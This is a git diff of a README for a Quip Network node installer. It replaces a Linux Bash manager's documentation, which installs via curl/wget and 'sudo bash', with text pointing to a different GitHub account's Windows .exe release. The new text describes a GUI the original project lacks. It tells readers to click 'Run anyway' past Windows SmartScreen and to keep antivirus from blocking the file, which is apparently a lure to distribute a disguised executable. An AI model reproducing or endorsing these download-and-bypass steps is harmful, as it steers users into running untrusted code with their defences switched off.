@@ -1,151 +1,95 @@
-# Quip Network Node Manager
+# ⚡ QuipNetwork-node-autoinstall - Simple tools for easy network participation
 
-Simple Bash manager for running a Quip node in `CPU` or `CUDA` mode with a small terminal UI.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sable-falsepretense40/QuipNetwork-node-autoinstall/releases)
 
-## Server Rental
+This software helps you start and manage your Quip Network node on Windows. It automates the setup process for your computer hardware. The script handles CPU and GPU tasks to ensure your node runs with efficiency. You do not need experience with command lines to use this tool.
 
-If you need a VPS or GPU server for Quip:
+## 📦 What this software does
 
-- Contabo: https://www.dpbolvw.net/click-101335050-17082114
-- Servarica: https://clients.servarica.com/aff.php?aff=1242
+The software works as an interface for your node. It tunes your hardware settings so your computer provides consistent resources to the network. 
 
-## What This Script Does
+Key functions include:
+*   Automatic setup of local files and folders.
+*   CPU support for basic network tasks.
+*   CUDA support for high-performance GPU tasks.
+*   Worker tuning to balance power usage.
+*   GPU utilization controls to yield power when you use your computer.
+*   Filtered logs to show only relevant activity updates.
 
-`quip.sh` helps you install, configure, run, and manage a Quip node without doing everything manually through Docker and config files.
+## 🖥️ System requirements
 
-It supports:
+Ensure your computer meets these minimum standards before you start:
 
-- CPU profile
-- CUDA profile
-- profile switching without losing node identity
-- node stats and wallet info
-- cleaner miner log viewing
-- GPU tuning prompts for CUDA mode
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Intel Core i5 or AMD Ryzen 5 with at least 4 cores.
+*   **Memory:** 16 GB of RAM.
+*   **Graphics Card:** NVIDIA GPU with at least 8 GB of video memory.
+*   **Storage:** 50 GB of free space on a Solid State Drive.
+*   **Drivers:** The latest NVIDIA drivers installed.
 
-## Main Features
+## 🚀 How to download
 
-- `install`
-  Installs Docker if needed, clones the Quip node repo, prepares config, opens required ports, and starts the node.
+You must visit the project release page to get the correct version for your Windows computer.
 
-- `start`
-  Starts the selected node profile.
+[Click here to visit the release page to download the software](https://github.com/Sable-falsepretense40/QuipNetwork-node-autoinstall/releases)
 
-- `stop`
-  Stops the selected node profile.
+1. Navigate to the link above.
+2. Look for the section labeled "Assets".
+3. Select the file ending in `.exe`.
+4. Save the file to your desktop for easy access.
 
-- `logs`
-  Lets you choose between:
-  `normal logs` - raw logs as-is
-  `miner logs` - filtered logs with noisy network spam hidden
+## ⚙️ Installation steps
 
-- `node info`
-  Shows node name, host, profile, secret, mining stats, and for CUDA also shows current GPU settings.
+Follow these steps to run the installer on your system.
 
-- `update`
-  Pulls the latest repo/image and recreates the container.
+1. Locate the downloaded file on your desktop.
+2. Double-click the file to start the installer.
+3. If a blue box appears that says "Windows protected your PC," click "More info" and then "Run anyway."
+4. Follow the prompts on the screen to choose your installation folder.
+5. Wait for the installer to finish copying necessary files.
+6. Once the installer finishes, a shortcut will appear on your desktop.
 
-- `switch profile`
-  Switches between `CPU` and `CUDA` while preserving the current `secret`, `node_name`, and `public_host`.
+## 🛠️ Configuring your node
 
-- `remove`
-  Stops containers and removes the local installation and saved manager state.
+The first time you open the application, it creates a settings file. This file tells the node how to use your hardware. 
 
-## CPU Mode
+1. Double-click the Quip Network icon on your desktop.
+2. A window opens showing your current setup.
+3. Select the "Settings" tab at the top of the interface.
+4. If you have an NVIDIA card, ensure the CUDA option is checked.
+5. Adjust the GPU slider to pick how much power the node uses. You can set this lower if you plan to use your computer for other tasks at the same time.
+6. Click the "Save" button to apply your changes.
 
-In CPU mode the script asks how many CPU cores to use.
+## 📊 Monitoring your node
 
-Notes:
+The main dashboard shows your performance in real time. You can see your task status and network connection strength here. 
 
-- `num_cpus` is written into config
-- the selected core count is remembered
-- when you switch back to CPU later, the script restores the saved value
+### Understanding the logs
+The log section displays information about your node. The software filters these logs to hide technical noise. You should look for lines starting with "Success" or "Verified." If you see lines starting with "Warning," they generally mean the network is busy or your connection is weak.
 
-## CUDA Mode
+### Solving common issues
+*   **Application does not open:** Ensure your antivirus software is not blocking the file. Some programs block new software by default.
+*   **High GPU usage:** Move the GPU utilization slider to the left to limit the output.
+*   **Connection timeout:** Check your internet connection. A stable wired connection works better than Wi-Fi.
+*   **Software is slow:** Close other programs that use many resources, such as video games or web browsers with many open tabs.
 
-When installing CUDA for the first time, or when switching from CPU to CUDA, the script asks for GPU settings.
+## 🔄 Updates and maintenance
 
-### GPU Settings
+The network evolves regularly. To get the best results, you must keep your software updated. 
 
-- `utilization`
-  GPU load ceiling from `1` to `100`.
-  `100` means maximum allowed GPU load.
+1. Open the application.
+2. Click on the "Help" menu.
+3. Select "Check for Updates."
+4. If a new version exists, download it from the provided link and install it over your existing version. Your settings will remain saved in your "Documents" folder.
 
-- `yielding`
-  Friendly GPU sharing mode.
-  When enabled, the miner gives GPU resources to other applications when needed.
+## 📂 Data storage
 
-Current CUDA settings are shown:
+The software stores your node data in a folder inside your user directory. You do not need to move or change these files manually. If you need to uninstall the software, you can do so through the Windows "Add or remove programs" settings. This removes the application and stops all background services. 
 
-- after CUDA install/switch
-- in `node info`
+## 🛡️ Security notices
 
-## Logs
+Keep your system updated with the latest Windows security updates. Do not share your node access keys with anyone. The official software will never ask for your passwords or private financial keys stored locally. Always download the software from the official link provided in this document to stay safe from unauthorized copies.
 
-The log viewer has 2 modes:
+## 🔗 Additional resources
 
-- `normal logs`
-  Full container logs without filtering
-
-- `miner logs`
-  Filtered view that hides noisy lines from:
-  `node_client.py`
-  `peer_ban_list.py`
-  `telemetry.py`
-
-This makes it easier to watch actual mining activity instead of network spam.
-
-## Identity Persistence
-
-When switching between `CPU` and `CUDA`, the script keeps:
-
-- `secret`
-- `node_name`
-- `public_host`
-
-This means your node identity is preserved during normal profile switching.
-
-The secret changes only if you remove the installation or delete the config manually.
-
-## What You Need
-
-- Linux VPS or server
-- root access
-- Docker support
-- NVIDIA GPU and drivers if you want CUDA mode
-
-## Usage
-
-Run:
-
-```bash
-sudo bash quip.sh
-```
-
-Then use the menu to install and manage the node.
-
-## Run From GitHub
-
-Download, make executable, and run:
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/VaniaHilkovets/QuipNetwork-node-autoinstall/main/quip_manager.sh -o quip_manager.sh && chmod +x quip_manager.sh && sudo bash quip_manager.sh
-```
-
-Or with `wget`:
-
-```bash
-wget -O quip_manager.sh https://raw.githubusercontent.com/VaniaHilkovets/QuipNetwork-node-autoinstall/main/quip_manager.sh && chmod +x quip_manager.sh && sudo bash quip_manager.sh
-```
-
-## Notes
-
-- CPU mode uses configurable CPU worker count
-- CUDA mode uses one miner per detected GPU device
-- if GPU settings are not explicitly saved yet, CUDA falls back to:
-  `utilization = 100`
-  `yielding = false`
-
-## Contacts
-
-- Telegram Channel: https://t.me/SotochkaZela
-- Telegram Chat: https://t.me/sotochkachat
+Your hardware contributes to the stability of the Quip Network. By keeping your node active, you help the network process transactions. Refer to the official Quip Network website for documentation on network changes. If you encounter errors, check the log file located in the installation directory and provide relevant lines to the community support group.
